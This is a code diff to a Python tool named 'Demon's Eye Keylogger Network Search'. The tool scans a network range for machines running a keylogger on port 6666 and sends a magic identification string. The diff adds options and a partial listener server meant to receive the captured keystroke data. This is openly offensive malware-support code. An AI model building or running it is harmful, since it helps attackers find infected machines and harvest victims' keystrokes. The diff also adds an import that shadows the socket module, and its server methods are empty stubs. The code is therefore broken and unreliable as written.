@@ -17,6 +17,7 @@
 #
 
 import argparse
+import base64
 import ipaddress
 import socket
 import threading
@@ -26,17 +27,20 @@ import urllib.request
 ########################################################
 # CONSTANTS
 ########################################################
-APPNAME = "Demon's Eye Keylogger Network Search"                    # Just a name
-VERSION = "1.0"                                                     # Version
-NET_ADDRESS = "192.168.10.0/24"                                     # Network adress range to scan (CIDR)
+from socket import socket
+
+APPNAME = 'Demon\'s Eye Keylogger Network Search'                   # Just a name
+VERSION = '1.0'                                                     # Version
+NET_ADDRESS = '192.168.10.0/24'                                     # Network adress range to scan (CIDR)
 KEYLOGGER_PORT = 6666                                               # Port of keylogger
-SERVER_PORT = 7777                                                  # Port to receive response connection when search DemonsEye
+DEFAULT_SERVER_PORT = 7777                                          # Port to receive response after connect
 PORT_LIST_SCAN = [KEYLOGGER_PORT]                                   # List of ports to Scan. For testing multiple ports
 MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='      # Message to indentify to keylogger
 BUFFER_SIZE = 4096                                                  # Buffer size
 DEFAULT_TIMEOUT = 2                                                 # Default Timeout (seconds)
+DEFAULT_NO_WAIT_RESPONSE = False                                    # No Wait response after sending message
 ENCODING = 'utf-8'                                                  # Encoding for message sended
-VERBOSE_LEVELS = ["none", "a bit", "insane debug"]                  # Verbose levels
+VERBOSE_LEVELS = ['none', 'a bit', 'insane debug']                  # Verbose levels
 
 
 ########################################################
@@ -56,20 +60,63 @@ max_concurrent_threads = 0                                          # Store max 
 # CLASSES
 ########################################################
 
+
+# Server Class to receive Data form Demon's Eye Keylogger
+class ListenServer(threading.Thread):
+    def __init__(self, host_bind, listen_port, max_clients, max_buffer_size):
+        threading.Thread.__init__(self)
+        self._host_bind = host_bind
+        self._server_port = listen_port
+        self._max_clients = max_clients
+        self._max_buffer_size = max_buffer_size
+        self._server_socket = None
+        self._server_running = False
+
+    def kill_server(self):
+        pass
+
+    def start_listen(self):
+        pass
+
+    def run(self):
+        # Create socket and bind to local host and port
+        try:
+            self._server_socket: socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self._server_socket.bind((self._host_bind, self._server_port))
+        except Exception as e:
+            print('ListenServer Exception : {}'.format(e))
+            return
+
+        # Start listening on socket
+        self._server_socket.listen(self._max_clients)
+        self._server_running = True
+        while self._server_running:
+            try:
+                (conn, (ip, port)) = self._server_socket.accept()   # Wait to accept a connection - blocking call
+            except Exception as e:
+                break                                               # Possibly closed server
+
+            pass
+
+
+
+
 # Scan a host (ip), for open ports in port_list
 # optionally, sends a message to host and wait response
 # can activate more verbosity for errors and control messages
 # can define a timeout for connection
 class HostScan(threading.Thread):
-    def __init__(self, ip, port_list, message, verbose = True, timeout = DEFAULT_TIMEOUT):
+    def __init__(self, ip, port_list, message, verbose, timeout, waitresponse):
         threading.Thread.__init__(self)
         self.open_ports = []
         self.ports = port_list                              # All ports can be self.ports = range(1, 0xffff + 1)
         self.ip = ip                                        # ip to scan
         self.message = message                              # message to send
         self.threads = []                                   # Thread list
-        self.timeout = timeout                              # Timeout - alternative: socket.setdefaulttimeout(timeout)
         self.verbose = verbose                              # Verbose
+        self.timeout = timeout                              # Timeout - alternative: socket.setdefaulttimeout(timeout)
+        self.wait = waitresponse                            # wait response after send message
         self.lock = threading.Lock()                        # thread lock
 
     def scan(self, host, port):
@@ -90,16 +137,29 @@ class HostScan(threading.Thread):
             try:
                 if len(str(self.message)) > 0:
                     if self.verbose >= 1:
-                        print("Sending message %s to %s:%s " % (self.message, host, port))
+                        print('Sending message %s to %s:%s ' % (self.message, host, port))
                     s.send(self.message.encode(ENCODING))
-                    response = s.recv(BUFFER_SIZE).decode(ENCODING)
+                    if self.wait:
+                        response = s.recv(BUFFER_SIZE).decode(ENCODING)
+                        # Decode if Base64
+                        try:
+                            response = str(base64.b64decode(response), ENCODING)
+                        except Exception as e:
+                            if self.verbose >= 2:
+                                print('Error decoding Base64 : {}'.format(e))
+                    else:
+                        response = ''
                 else:
-                    response = ""
+                    response = ''
+            except Exception as e:
+                response = '[No Response]'
+                if self.verbose >= 2:
+                    print('No response : %s ' % e)
             finally:
-                self.open_ports.append("Host %s Port %s [Open] %s" % (host, port, response))
-        except Exception as ex:
+                self.open_ports.append('Host %s Port %s [Open] %s' % (host, port, response))
+        except Exception as e:
             if self.verbose >= 2:
-                print("Host %s Port %d Exception %s " % (host, port, ex))
+                print('Host %s Port %d Exception %s ' % (host, port, e))
             pass
         finally:
             s.close()
@@ -116,7 +176,7 @@ class HostScan(threading.Thread):
     def run(self):
         self.threads = []
         if self.verbose >= 2:
-            print("Start scan " + str(self.ip))
+            print('Start scan ' + str(self.ip))
         # Enumerate ports list and scan and add to thread
         for i, port in enumerate(self.ports):
             s = threading.Thread(target=self.scan, args=(self.ip, port))
@@ -134,7 +194,7 @@ class HostScan(threading.Thread):
 # Scan a range of IPs for open ports
 # Get CIDR net_gange, List of port_list, message to send, verbosity
 class RangeScan(threading.Thread):
-    def __init__(self, net_range, port_list, message, verbose = True, timeout = DEFAULT_TIMEOUT):
+    def __init__(self, net_range, port_list, message, verbose, timeout, waitresponse):
         threading.Thread.__init__(self)
         self.active_hosts = []                                      # IP Host list with at least one open port
         self.ip_net = ipaddress.ip_network(net_range)               # Create the network
@@ -146,16 +206,17 @@ class RangeScan(threading.Thread):
         self.own_host = socket.gethostname()                        # Client Host name
         self.own_ip = socket.gethostbyname(self.own_host)           # Client Host ip
         self.timeout = timeout                                      # Timeout
+        self.wait = waitresponse
         self.hosts_scanned = 0                                      # Total hosts scanned
 
     def start(self):
         if self.verbose >= 2:
-            print("This host is %s %s " % (self.own_host, self.own_ip))
+            print('This host is %s (%s) ' % (self.own_host, self.own_ip))
 
         self.hosts_scanned = 0
         for ip in self.all_hosts:                                   # Scan the network range
             # Thread host port scan
-            hs = HostScan(str(ip), self.port_list, self.message, self.verbose, self.timeout)
+            hs = HostScan(str(ip), self.port_list, self.message, self.verbose, self.timeout, self.wait)
             hs.start()
             self.threads.append(hs)
             self.hosts_scanned += 1
@@ -171,7 +232,7 @@ class RangeScan(threading.Thread):
 
 # Obtiene la ip externa - Get the external ip
 def get_external_ip():
-    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+    external_ip = urllib.request.urlopen('https://ident.me').read().decode(ENCODING)
     return external_ip
 
 
@@ -179,16 +240,22 @@ def get_external_ip():
 def parse_params():
     parser = argparse.ArgumentParser(description='Demon\'s Eye Keylogger Network Search',
                                      epilog='You can also use it to scan specific ports on a network.')
-    parser.add_argument("-r", "--range", type=str, default=NET_ADDRESS, required=True,
-                        help="Specify the network range in CIDR format. Example: 192.168.1.0/24")
-    parser.add_argument("-p", "--ports", type=int, nargs='+', default=list(PORT_LIST_SCAN),
-                        help="Specify a list of ports to scan. Default value: " + str(PORT_LIST_SCAN))
-    parser.add_argument("-m", "--message", type=str, default=MAGIC_MESSAGE,
-                        help="Message to send to host. If empty, -m '', then not message is sent. Default value: " + MAGIC_MESSAGE)
-    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT,
-                        help="Timeout in seconds on port connection. Default value: " + str(DEFAULT_TIMEOUT))
-    parser.add_argument("-v", "--verbose", type=int, choices=[0,1,2], default=0,
-                        help="Increase output verbosity. Default value: 0")
+    parser.add_argument('-r', '--range', type=str, default=NET_ADDRESS, required=True,
+                        help='Specify the network range in CIDR format. Example: 192.168.1.0/24')
+    parser.add_argument('-p', '--ports', type=int, nargs='+', default=list(PORT_LIST_SCAN),
+                        help='Specify a list of ports to scan. Default value: ' + str(PORT_LIST_SCAN))
+    parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
+                        help='Message to send to host. If empty (-m \'\'), then not message is sent. Default value: ' + MAGIC_MESSAGE)
+    parser.add_argument('-n', '--nowaitresponse', action='store_true', default=DEFAULT_NO_WAIT_RESPONSE,
+                        help='Wait response from host after sending Message (if sent). Default value: ' + str(DEFAULT_NO_WAIT_RESPONSE))
+    parser.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT,
+                        help='Timeout in seconds on port connection. Default value: ' + str(DEFAULT_TIMEOUT))
+    parser.add_argument('-e', '--enableserver', action='store_true', default=False,
+                        help='Enable Server to receive Demon\'s Eye Keylogger Data')
+    parser.add_argument('-s', '--serverport', type=int, default=DEFAULT_SERVER_PORT,
+                        help='If the keylogger is found, it establishes a server to receive data. Default value: ' + str(DEFAULT_SERVER_PORT))
+    parser.add_argument('-v', '--verbose', type=int, choices=[0,1,2], default=0,
+                        help='Increase output verbosity. Default value: 0')
     args = parser.parse_args()
     return args
 
@@ -200,30 +267,37 @@ def main():
     net_range = args.range
     port_list = args.ports
     message = args.message
+    waitresponse = not args.nowaitresponse
     timeout = args.timeout
+    enable_server = args.enableserver
+    server_port = args.serverport
 
     # Host info
     hostname = socket.gethostname()
     localip = socket.gethostbyname(hostname)
     externalip = get_external_ip()
 
-    print("Verbose level "+str(VERBOSE_LEVELS[verbose]))
-    print("Network range "+args.range)
-    print("Ports list "+str(args.ports))
-    print("Message to send '"+args.message+"'")
-    print("Timeout %d seconds" % (args.timeout))
-    print("---")
-    print("This Host %s : IP local %s : IP wan %s" % (hostname, localip, externalip))
-    print("Scanning ...")
+    print('Verbose level '+str(VERBOSE_LEVELS[verbose]))
+    print('Network range to scan '+net_range)
+    print('Ports list '+str(port_list))
+    print('Message to send \''+message+'\'')
+    print('Wait response after sende message '+str(waitresponse))
+    print('Timeout %d seconds' % (timeout))
+    if enable_server:
+        print('Enabled Server to receive Keylogger Data at port %s' % server_port)
+    print('---')
+    print('This Host %s : IP local %s : IP wan %s' % (hostname, localip, externalip))
+    print('Scanning ...')
     start = time.perf_counter()
-    scanner = RangeScan(net_range, port_list, message, verbose, timeout)
+    scanner = RangeScan(net_range, port_list, message, verbose, timeout, waitresponse)
     scanner.start()
     total_hosts = scanner.hosts_scanned
     total_time = time.perf_counter() - start
-    print("Scanned %d hosts at %s in %6.2f seconds " % (total_hosts, args.range, total_time))
-    print("Total %d threads launched, and max simultaneous was %d threads" % (total_threads_launched, max_concurrent_threads))
+    print('Scanned %d hosts at %s in %6.2f seconds ' % (total_hosts, args.range, total_time))
+    print('Total %d threads launched, and max simultaneous was %d threads' % (total_threads_launched, max_concurrent_threads))
     if total_current_threads_running > 0:
-        print("Something strange happes because the threads running is %d " % (total_current_threads_running))
+        print('Something strange happes because the threads running is %d ' % (total_current_threads_running))
+
 
 if __name__ == '__main__':
     main()
